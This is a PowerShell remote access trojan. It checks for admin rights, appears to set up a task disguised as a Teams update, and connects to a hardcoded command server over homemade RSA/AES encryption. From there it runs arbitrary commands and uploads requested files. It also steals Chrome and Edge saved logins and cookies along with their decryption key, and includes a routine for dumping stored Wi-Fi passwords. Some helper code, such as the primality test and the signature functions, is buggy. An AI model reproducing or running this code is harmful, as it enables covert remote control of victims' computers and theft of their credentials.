function pow-mod($x,$y,$z)
{
    $n = [System.Numerics.BigInteger]1
    $x = [System.Numerics.BigInteger]$x
    $y = [System.Numerics.BigInteger]$y
    $z = [System.Numerics.BigInteger]$z
    while ($y -gt 0)
    {
        if (-not($y % 2 -eq 0))
        {
            $n = $n * $x % $z
        }
        $y = $y -shr 1
        $x = $x * $x % $z
    }
    return $n
}


function power($x,$y)
{
    $n = [System.Numerics.BigInteger]::Parse("1")
    for ($i=0; $i-lt$y; $i++)
    {
        $n=$n*$x
    }
    return $n
}


function is-prime($n)
{

    $primes = (2,3,5)
    if ($n -eq 0)
    {
        return $false
    }
    if ($n -eq 1)
    {
        return $false
    }
    if ($primes.Contains($n))
    {
        $true
    }
    if ($n -lt 5)
    {
        return $false
    }

    if ($n % ($n -shr 1) -eq 0)
    {
        return $false
    }
    for ($i=2; $i-lt([Math]::SQRT($n)+1);$i++)
    {
        if ($n % $i -eq 0)
        {
            return $false
        }
    }
    return $true

}



function div2($n)
{
    $e = $n-1
    $m = 0
    while ($e%2 -eq 0)
    {
        $e = $e -shr1
        $m = $m + 1
    }
    return $e, $m
    
}



function iterat($a, $e, $m, $n)
{
    $a=[System.Numerics.BigInteger]$a
    $e=[System.Numerics.BigInteger]$e
    $m=[System.Numerics.BigInteger]$m
    $n=[System.Numerics.BigInteger]$n
    if ((pow-mod -x $a -y $e -z $n) -eq 1)
    {
        return $true
    }
    for ($i=0; $i-lt $m; $i++)
    {
        $y = (power -x 2 -y $i)*$e
        $t = pow-mod -x $a -y $y -z $n
        if ($t -eq $n-1)
        {
            return $true
        }       
    }
    return $false

}



function miler-rabin($n)
{
    $em = (div2 -n $n)
    $e = [System.Numerics.BigInteger]$em[0]
    $m = [System.Numerics.BigInteger]$em[1]
    $n = [System.Numerics.BigInteger]$n
    for ($i=0;$i-lt 20; $i++)
    {
        $a = GetRandomRange -min 2 -max $n
        if (-not(iterat -a $a -e $e -m $m -n $n))
        {
            return $false
        }
    }
    return $true
}




function get-prime2($nbit)
{
    $primes = @(2)
    for ($i=3; $i-lt 1000; $i++)
    {
        if (is-prime -n $i)
        {
            $primes+=$i
        }
    }
    while ($true)
    {
        $p = (random-bit -nbi $nbit)
        $p = [System.Numerics.BigInteger]$p
        $c=0
        foreach($t in $primes)
        {
            $t = [System.Numerics.BigInteger]$t
            if ($p % $t -eq [System.Numerics.BigInteger]0)
            {
                $c=1
                break
            }
        }
        if ($c -eq 0)
        {
            $prime = (miler-rabin -n $p)
            if ($prime)
            {
                return $p
            }
        }
    }
}

function GetRandomRange($min,$max){
    $min = [System.Numerics.BigInteger]::Parse($min)
    $max = [System.Numerics.BigInteger]::Parse($max)
    $r = [System.Numerics.BigInteger]::Parse(([System.Numerics.BigInteger](Get-Random -Minimum $min -Maximum $max)))
    return $r
}

function random-bit($nbi)
{
    $min = [System.Numerics.BigInteger]$nbi -1
    $max = [System.Numerics.BigInteger]$nbi
    $r = GetRandomRange -min ((power -x 2 -y $min)+1) -max ((power -x 2 -y $max)-1)
    return [System.Numerics.BigInteger]::Add($r,1)
}


class Euclids
{
    [System.Numerics.BigInteger]gcd ($a,$b)
   {
        $r=[System.Numerics.BigInteger]0
        while ($true)
        {
            if($a-eq 0 -or $b -eq 0)
            {
                break
            }
            $na=$a
            $nb=$b
            $a = $na % $nb
            $b = $nb % $na
            $r = $b + $a 
        }
        return $r
   }
   
   [array]gcdx ($a,$b)
   {
        #$r=[System.Numerics.BigInteger]0
        if ($a -eq 0)
        {
            return $b,0,1
        }
        $r = [System.Numerics.BigInteger] $b%$a
        $g = [Euclids]::new().gcdx($r,$a)
        $r = [System.Numerics.BigInteger]$g[0]
        $x1 = [System.Numerics.BigInteger]$g[1]
        $y1 = [System.Numerics.BigInteger]$g[2]
        $x = [System.Numerics.BigInteger]$y1 - ([System.Numerics.BigInteger]::Divide($b,$a)) * $x1
        $y = [System.Numerics.BigInteger]$x1
        return $r,$x,$y
   }
}


class BitConvert 
{
    hidden [System.Numerics.BigInteger]div256($n)
    {
        while(($n -gt 256 )-or ($n -eq 256)){
            $n = [System.Numerics.BigInteger]$n/256
        }
        return [System.Numerics.BigInteger]$n
    }

    [System.Numerics.BigInteger]getBitLen([System.Numerics.BigInteger]$n){
        $c = 1
        while(($n -gt 256 )-or ($n -eq 256)){
            $n = [System.Numerics.BigInteger]::Divide($n,256)
            $c += 1
        }
        return $c
    }

    [array]intToByete($n,$len){
        $b = @()
        for ($i=0; $i -lt $len; $i++){
            $b += ($n % 256)
            $n = [System.Numerics.BigInteger]::Divide($n, 256)
        }
        [System.Array]::Reverse($b)
        return $b
    }

    [System.Numerics.BigInteger]bytesToInt($bytesarray)
    {
        $c = $bytesarray.Length
        $c = [System.Numerics.BigInteger]$c -1
        $n = 0
        for ($i=0;-not($i-gt$c);$i++)
        {
            $m = power -x 256 -y ($c-$i)
            $r = [System.Numerics.BigInteger]::Multiply($m,[System.Numerics.BigInteger]$bytesarray[$i])
            $n = [System.Numerics.BigInteger]::Add($r,$n)
        }
        return [System.Numerics.BigInteger]$n
    }
}


class RSA
{
    [array]genPrivateKey($nbit)
    {
        $e = [System.Numerics.BigInteger] 65537
        $p = get-prime2 -nbit $nbit
        $q = get-prime2 -nbit $nbit
        $n = [System.Numerics.BigInteger] $q*$p
        $phi = [System.Numerics.BigInteger]($p-1)*($q-1)
        $x = [Euclids]::new().gcdx($e,$phi)[1]
        $d = [System.Numerics.BigInteger]$phi+$x
        $public = @($e,$n)
        $private = @($e,$p,$q,$n,$d)
        return @($public,$private)  
    }

    [System.Numerics.BigInteger]encrypt($public,$m)
    {
        $e = [System.Numerics.BigInteger] $public[0]
        $n = [System.Numerics.BigInteger] $public[1]
        $enc = pow-mod -x $m -y $e -z $n
        return $enc
    }
    [System.Numerics.BigInteger]decrypt($private,$m)
    {
        $d = $private[-1]
        $n = $private[-2]
        $dec = pow-mod -x $m -y $d -z $n
        return $dec
    }
    [array]encryptData($public,$data)
    {
        $con = [BitConvert]::new()
        $m = $con.bytesToInt($data)
        $enc = [RSA]::new().encrypt($public,$m)
        $bitlen = $con.getBitLen($enc)
        return $con.intToByete($enc,$bitlen)
    }
    [array]decryptData($private,$data)
    {
        $con = [BitConvert]::new()
        $m = $con.bytesToInt($data)
        $dec = [RSA]::new().decrypt($private,$m)
        $bitlen = $con.getBitLen($dec)
        return $con.intToByete($dec,$bitlen)
    }

    [string]signature($private,$message)
    {
        $d = $private[2]
        $n = $private[3]
        $hasher = [System.Security.Cryptography.HashAlgorithm]::Create('sha256')
        $hash = $hasher.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($message))
        $hash = bytes-toInt($hash)
        $s = pow-mod -x $hash -y $d -z $n
        $s = intToByetes -n $s -len 32
        return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($s))
    }


    [string]verifySignature($public,$signature,$message)
    {
        $e = [System.Numerics.BigInteger] $public[0]
        $n = [System.Numerics.BigInteger] $public[1]
        $hasher = [System.Security.Cryptography.HashAlgorithm]::Create('sha256')
        $hash = $hasher.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($message))
        $hash = bytes-toInt($hash)
        $m = bytes-toInt($message)
        if ((pow-mod -x $m -y $e -z $n) -eq $hash)
        {
            return $true
        }
        return $false
    }

}


class AEScrypto
{

    [object]$aesManaged
    [object]$encryptor
    [object]$decryptor
    [object]$chipher
    [array]$key
    [array]$iv

    AEScrypto([array]$key,[array]$iv){
        $this.aesManaged = New-Object "System.Security.Cryptography.AesManaged"
        $this.aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $this.aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::pkcs7
        $this.aesManaged.Key = $key
        $this.aesManaged.IV = $iv
        $this.encryptor = $this.aesManaged.CreateEncryptor()
        $this.decryptor = $this.aesManaged.CreateDecryptor()
        
    }

    [array]randomIV($oldIV){
        return [System.Security.Cryptography.MD5]::Create().ComputeHash($oldIV)
    }

    [array]encrypt($data){
        return $this.encryptor.TransformFinalBlock($data, 0, $data.Length)
    }

    [array]decrypt($data)
    {
        return $this.decryptor.TransformFinalBlock($data,0, $data.Length)
    }
}


class Client
{
    [string]$ip
    [int]$port
    client([string]$ip,[int]$port)
    {
        $this.ip = $ip
        $this.port = $port
    }

    hidden[object]connect()
    {

        [object]$sock = New-Object System.Net.Sockets.TcpClient
        $sock.Connect($this.ip,$this.port)
        $sock.Client.SendTimeout = -1
        $sock.Client.ReceiveTimeout = -1
        [object]$stream = $sock.GetStream()
        return $stream
    }

    [bool]sync($stream){
        $buffer = New-Object System.Byte[] 1
        $stream.Read($buffer,0,1)
        if($buffer -like 114){
            return $true
        }
        return $false 
    }

    [array]readmsg($stream){
        $buffer = New-Object System.Byte[] 4
        $stream.Read($buffer,0,4)
        $header = [BitConverter]::ToInt32($buffer,0)
        $buffer = New-Object System.Byte[] $header
        $stream.Read($buffer,0,$header)
        $stream.Write([byte[]]114,0,1)
        return $buffer
    }

    [void]handle($stream){
        $stream.send([byte[]]1)
        Start-Sleep -Seconds 4
    }

    [bool]send($content,$stream)
    {
        $header = [BitConverter]::GetBytes($content.Length)
        $content = $header + $content
        $stream.Write($content, 0, $content.Length)
        return $this.sync($stream)
    }

    [array]sendKey($stream,$public){
        $rsa = [RSA]::new()
        $key = @()
        for ($i=0;$i -lt 64; $i++){
            $key += (Get-Random -Minimum 0 -Maximum 255)
        }
        while($true){
            if ((($this.readmsg($stream)).Length) -gt 2){
                break
            }
        }
        $key = [System.Security.Cryptography.SHA256]::Create().ComputeHash($key)
        $iv = [System.Security.Cryptography.MD5]::Create().ComputeHash($key)
        $tosend = $rsa.encryptData($public,$key)
        $this.send($tosend,$stream)
        return @($key,$iv)
    }

}


function GetFile-Bytes($FilePath){
    try{
        return ([System.IO.File]::ReadAllBytes($FilePath))
    }catch{
        $file = New-Object System.IO.FileStream($FilePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        $content = New-Object byte[] $file.Length
        $___ = $file.Read($content, 0, $file.Length)
        $___ = $file.Close()
        return $content
    }
}


class WebGather{

    [Object]$pathes
    [string] $homepath 

    WebGather(){
        $this.homepath = Get-HomeProfile
        $this.pathes = @{
            'chrome' = "$($this.homepath)\AppData\Local\Google\Chrome\User Data"
            'edge' = "$($this.homepath)\AppData\Local\Microsoft\Edge\User Data"
            'chrome cookies' = "$($this.homepath)\AppData\Local\Google\Chrome\User Data"
            'edge cookies' = "$($this.homepath)\AppData\Local\Google\Chrome\User Data"
        }
    }

    [array]GCMkey($WEB){
        $path = $this.pathes.$WEB
        $content = Get-Content -Path "$path\Local State" -Raw | ConvertFrom-Json
        $baseGC = $content.os_crypt.encrypted_key
        $GCKEY = [System.Convert]::FromBase64String($baseGC)
        $comm = '[System.Security.Cryptography.ProtectedData]::Unprotect(
            $GCKEY[5 .. ($GCKEY.length-1)], 
            $null, 
            [System.Security.Cryptography.DataProtectionScope]::LocalMachine)'
        return (Invoke-Expression -Command $comm)
    }

    [Object]SendDataBase($WEB,$client,$key,$iv,$stream){
        $path = $this.pathes.$WEB
        $profiles =  (Get-ChildItem -Path $path -Directory | Where {($_.FullName -like "*Profile*" -or $_.FullName -like "*Default*") -and ($_.FullName -notlike "*System Profile*")}).FullName
        if ($WEB.Contains('cookies')){
            $f = "Network\Cookies"
        }else{$f = 'Login Data'}
        $___ = $client.send([AEScrypto]::new($key,$iv).encrypt($this.GCMkey($WEB)),$stream)
        foreach($i in $profiles){
            $p = [AEScrypto]::new($key,$iv).encrypt(([System.Text.Encoding]::ASCII.GetBytes($i)))
            $d = [AEScrypto]::new($key,$iv).encrypt((GetFile-Bytes -FilePath "$i\$f"))
            $___ = $client.send($p,$stream)
            $___ = $client.send($d,$stream)
        }
        $___ = $client.send([AEScrypto]::new($key,$iv).encrypt(@(101, 110, 100, 46)),$stream)
        return [AEScrypto]::new($key,$iv)
    }
}


function get-wifiPasswords
{   
    $test = netsh wlan show profiles
    $profiles = @()
    foreach($i in $test)
    {
        if($i.contains("All User Profile"))
        {
            $profiles+=$i.Split(':')[-1].Trim()
        }
    }
    $passwords = ""
    foreach($i in $profiles)
    {
        $password = netsh wlan show profile $i key = clear
        if (([string]$password).Contains("Key Content"))
        {
            foreach($n in $password)
            {
                if ($n.contains("Key Content"))
                {
                    $keyCon = $n.split(' : ')[-1].Trim()
                    $passwords+="$i     :    $keyCon`n"
                }
            }
        }
    }
    return $passwords
}

function Excmd
{

   param
   (
        [Parameter(Mandatory)]
        [string] $command
    )
    try{
        return (Invoke-Expression -Command $command | Out-String ).Trim()
    }
    catch {
        return "=A+Z-E^R^O&R$_"
    }
   
}

function Assert-RunOnce{
    if (-not(Test-Path "$env:TEMP\65923497834567834693845988734893.tmp")){
        New-Item -Path "$env:TEMP\65923497834567834693845988734893.tmp" -ItemType "file" -Force 
    }
    try{
        $file = [System.IO.File]::Open("$env:TEMP\65923497834567834693845988734893.tmp", [System.IO.FileMode]::Open)
        return
    }catch{
        exit
    }
}

function Get-SockStream($client) {
    try{
        return $client.connect()
    }catch{
        return $false
    }
}

function Assert-Admin(){
    if (-not(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)))
    {
        exit
    }
}

function Get-HomeProfile(){
    $username = ((Get-WmiObject -ClassName Win32_ComputerSystem).UserName).Split('\')[-1]
    $UserID = (Get-WmiObject -Class Win32_UserAccount | Where-Object { $_.Name -eq $username }).sid
    return (Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\ProfileList\$UserID").ProfileImagePath
}
function Start-Teams(){
    $homepath = Get-HomeProfile
    Creat-NewTask -path "$homepath\AppData\Local\Microsoft\Teams\Update.exe" -argument "--processStart Teams.exe" -Name "UpdateTeams"
}

function Start-Main{

    $n = [System.Numerics.BigInteger]::Parse("24167402767654577565716389815235569967390138512024137497386480228714459623333728107550442019967341332053940559315871104193316625676287327705224404592395885695827727800334356656078494465334764933984362150328647642679827786023792149061377853406629987146126403665715498483598938424562357472270283226106922575054267526543955052845613720230410609968151396625485965130532490768894210017875706817812676831767822251026991167386779935369014898100686467230341800659314991606618373358316608131771884170257420378343129059831609845883841561567536343257616438711061881770390832717316958948348326818632753120572695814500526819624897")
    $e = [System.Numerics.BigInteger]::Parse("65537")
    $PUBLIC = @($e,$n)
    while($true){
        try{
            $client = [Client]::new($global:SERVIP, 999)
            $stream = Get-SockStream -client $client
            if ($stream -eq $false){
                continue
            }
            $ciphers = $client.sendKey($stream,$PUBLIC)
            $encryptionKey = $ciphers[0]
            $iv = $ciphers[-1]
            $randomal = $ciphers[-1]
            $aes = [AEScrypto]::new($encryptionKey,$iv)
            while ($true){
                $randTheIv = $true
                $message = ($client.readmsg($stream))
                $reader = [System.Text.Encoding]::ASCII.GetString($aes.decrypt($message))
                if  ($reader -like "steale password*"){
                    $WEB = ($reader -split "password")[-1].Trim()
                    $aes = [WebGather]::new().SendDataBase($WEB,$client,$encryptionKey,$randomal,$stream)
                    $randTheIv = $false
                }
                elseif ($reader.StartsWith("GetFileBytes -pin")){
                    $path = (($reader -split "GetFileBytes -pin")[-1]).Trim()
                    if(Test-Path -Path $path){
                        $___ = $client.send($aes.encrypt((GetFile-Bytes -FilePath $path)),$stream)
                    }else{
                        $___ = $client.send(
                            $aes.encrypt(@(70,105,108,101,32,100,111,101,115,110,39,116,32,101,120,105,115,116)),
                            $stream
                        )
                    }
                }
                else{
                    $out = $aes.encrypt([System.Text.Encoding]::ASCII.GetBytes((Excmd -command ($reader))))
                    $___ = $client.send($out,$stream)
                }
                if ($randTheIv){
                    $randomal = ([System.Security.Cryptography.MD5]::Create().ComputeHash($randomal))[0 .. 32]
                    $aes = [AEScrypto]::new($encryptionKey,$randomal)
                }
            }
        }
        catch{
            Start-Sleep -Seconds 2
        }
    }
}

Assert-Admin
Assert-RunOnce
Add-Type -AssemblyName System.Security
Set-Variable -Scope Global -Name "bultInVars" -Value ((Get-Variable).Name)
$global:SERVIP="192.168.137.1"
Start-Teams
Start-Main
